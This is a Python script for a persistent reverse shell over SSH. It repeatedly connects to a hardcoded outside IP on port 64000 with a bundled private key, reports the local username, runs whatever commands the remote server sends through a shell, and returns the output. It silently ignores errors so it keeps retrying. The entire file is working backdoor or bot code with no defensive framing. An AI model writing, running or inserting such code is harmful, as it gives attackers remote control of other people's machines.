

import os
import time
import threading
import paramiko
import subprocess

def exec_underlying_command(command):
    if isinstance(command, bytes):
        command = command.decode()

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    result = None
    if process.returncode == 0:
        result = stdout.decode()
    else:
        result = stderr.decode()

    return result.strip('\n')


def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    private_key = paramiko.RSAKey.from_private_key_file(key_file)
    
    client.connect(ip, username=user, pkey=private_key, port=port)

    ssh_session = client.get_transport().open_session()
        
    server_instructions = None

    while server_instructions != "kill":
        if ssh_session.active:
            ssh_session.send(bot_user.encode())

            server_instructions = ssh_session.recv(1024).decode().strip()

            if server_instructions:

                if server_instructions == 'kill':
                    ssh_session.close()
                    client.close()
                    return

                response = exec_underlying_command(server_instructions)

                ssh_session.send(response.encode())


                ssh_session.close()
                client.close()
                return
                
        time.sleep(1)

    client.close()

if __name__ == "__main__":

    command = "whoami".encode()
    user = exec_underlying_command(command)

    while True:
        try:
            ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
        except Exception as e:
            pass

        time.sleep(1)
